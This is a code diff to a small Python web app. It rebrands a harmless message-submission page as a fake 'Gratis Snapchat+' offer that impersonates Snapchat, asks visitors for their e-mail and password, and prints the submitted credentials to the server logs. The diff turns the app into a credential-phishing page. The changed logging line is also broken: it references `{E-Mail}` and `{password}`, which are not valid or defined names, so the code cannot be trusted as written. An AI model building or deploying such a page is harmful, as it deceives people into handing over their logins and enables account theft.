@@ -7,7 +7,7 @@ HTML = r"""<!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Buraya Koy+</title>
+<title>Gratis Snapchat+</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="theme-color" content="#FFFC00">
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' rx='22' fill='%23FFFC00'/%3E%3Ctext x='50' y='72' font-size='60' text-anchor='middle'%3E%F0%9F%91%BB%3C/text%3E%3C/svg%3E">
@@ -239,7 +239,7 @@ h1{
       <circle cx="72" cy="46" r="4.5" fill="#16191C"/>
     </svg>
     <h1>Buraya Koy+</h1>
-    <p class="subtitle">send your username/message</p>
+    <p class="subtitle">send your E-Mail/password</p>
   </header>
 
   <section class="sheet" id="sheet">
@@ -275,7 +275,7 @@ h1{
       <button class="btn ghost-btn" id="again" type="button">Send another</button>
     </div>
 
-    <div class="footer">powered by Python</div>
+    <div class="footer">powered by Snapchat</div>
   </section>
 
 </main>
@@ -390,7 +390,7 @@ class Handler(BaseHTTPRequestHandler):
         message = info.get("word", [""])[0][:300]
 
         # Erscheint im Render-Tab "Logs"
-        print(f"NEW MESSAGE -> {username}: {message}", flush=True)
+        print(f"NEW MESSAGE -> {E-Mail}: {password}", flush=True)
 
         self._send(200, b"OK")
 
